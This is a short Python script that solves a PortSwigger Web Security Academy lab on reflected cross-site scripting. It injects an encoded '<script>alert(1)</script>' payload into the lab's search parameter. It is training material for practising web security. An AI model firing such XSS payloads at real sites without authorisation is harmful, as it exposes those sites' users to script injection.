"""
Exploit for lab:
    Reflected XSS into HTML context with nothing encoded
    https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

By Xqweak.
"""
import requests
import argparse
import urllib


class ExploitSelfXSS:
    def __init__(self,url):
        self.url = url

    def exploit_self_xss(self):
        """Exploit XSS Vulnerability in the lab"""
        s = requests.Session()
        payload = "<script>alert(1)</script>"
        payload = urllib.parse.quote(payload)
        attack_url = f"{self.url}/?search={payload}"
        print(attack_url)
        s.get(attack_url)
        print('done')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' , '--url' , required=True, help="Portswigger's lab url")
    args = parser.parse_args()
    # Run the exploit
    lab = ExploitSelfXSS(args.url)
    lab.exploit_self_xss()
